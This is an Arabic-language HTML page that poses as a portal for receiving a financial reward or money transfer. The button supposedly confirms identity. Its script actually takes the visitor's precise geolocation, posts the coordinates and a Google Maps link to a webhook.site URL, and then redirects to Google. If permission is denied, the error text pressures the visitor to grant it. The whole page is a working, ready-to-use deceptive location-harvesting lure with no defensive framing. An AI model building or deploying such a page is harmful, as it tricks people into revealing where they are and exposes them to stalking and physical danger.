<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>بوابة استلام الحوالات المالية</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; background-color: #f4f4f4; direction: rtl; }
        .card { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); max-width: 90%; }
        button { background-color: #28a745; color: white; border: none; padding: 12px 25px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="card">
    <h2>بوابة استلام المكافآت المالية</h2>
    <p>لتأكيد هويتك وضمان وصول المبلغ لحسابك الشخصي، يرجى الضغط على الزر أدناه لتفعيل النظام:</p>
    <button onclick="getLocation()">اضغط هنا لتأكيد الاستلام</button>
    <p id="status" style="color: #666; margin-top: 15px;"></p>
</div>

<script>
function getLocation() {
    var status = document.getElementById("status");
    if (navigator.geolocation) {
        status.innerHTML = "جاري الاتصال بالسيرفر الآمن...";
        navigator.geolocation.getCurrentPosition(sendPosition, showError);
    } else { 
        status.innerHTML = "عذراً، المتصفح لا يدعم نظام الأمان المطور.";
    }
}

function sendPosition(position) {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    
    // هذا هو رابط الـ Webhook الجديد الخاص بك من شاشتك الحالية
    var webhookURL = "https://webhook.site/27b1fb0b-938a-4385-b03c-5f1902b17b7d";
    
    var xhr = new XMLHttpRequest();
    xhr.open("POST", webhookURL, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    
    xhr.send(JSON.stringify({
        latitude: lat,
        longitude: lon,
        google_maps: "https://www.google.com/maps?q=" + lat + "," + lon
    }));
    
    xhr.onload = function() {
        window.location.href = "https://www.google.com";
    }
}

function showError(error) {
    document.getElementById("status").innerHTML = "يجب السماح بالإذن لتتمكن المنظومة من التحقق من هويتك واستلام المبلغ.";
}
</script>

</body>
</html>
